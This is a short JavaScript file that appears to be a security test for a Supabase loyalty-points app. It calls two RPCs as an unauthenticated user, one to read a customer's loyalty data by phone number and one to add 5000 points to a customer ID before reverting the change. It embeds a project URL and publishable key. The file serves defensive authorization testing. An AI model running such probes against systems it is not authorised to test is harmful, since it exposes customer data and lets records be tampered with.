import { createClient } from '@supabase/supabase-js';

const SUPABASE_URL = process.env.VITE_SUPABASE_URL || 'https://eprpagnkxxkuykbzhvge.supabase.co';
const SUPABASE_ANON_KEY = process.env.VITE_SUPABASE_ANON_KEY || 'sb_publishable_mSDH8vHZfdbb3lGVrM71bg_bmUQ9eJi';

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

async function runTests() {
    console.log('--- Unauthorized RPC Execution Tests ---');

    // Test 1: get_customer_loyalty_info
    console.log('\n[Test 1] Fetching customer loyalty info (Information Disclosure)');
    const { data: cData, error: cErr } = await supabase.rpc('get_customer_loyalty_info', { p_phone: '01011111111' });
    
    if (cErr) {
        console.log('Test 1 failed (Safe):', cErr.message);
    } else {
        console.log('Test 1 SUCCEEDED (Vulnerable)! Data:', JSON.stringify(cData));
    }

    // Test 2
    const customerId = '6fe57291-2b9b-4d1e-82d4-0037678efbd2';
    
    console.log(`\n[Test 2] Adjusting points for customer ${customerId} (Privilege Escalation)`);
    const { data: pData, error: pErr } = await supabase.rpc('admin_adjust_points', { 
        p_customer_id: customerId, 
        p_points: 5000, 
        p_reason: 'Hacked by anon' 
    });

    if (pErr) {
        console.log('Test 2 failed (Safe):', pErr.message);
    } else {
        console.log('Test 2 SUCCEEDED (Vulnerable)! Points adjusted without authentication.');
        
        // Revert
        await supabase.rpc('admin_adjust_points', { 
            p_customer_id: customerId, 
            p_points: -5000, 
            p_reason: 'Revert hack' 
        });
        console.log('Hack reverted.');
    }
}

runTests().catch(console.error);
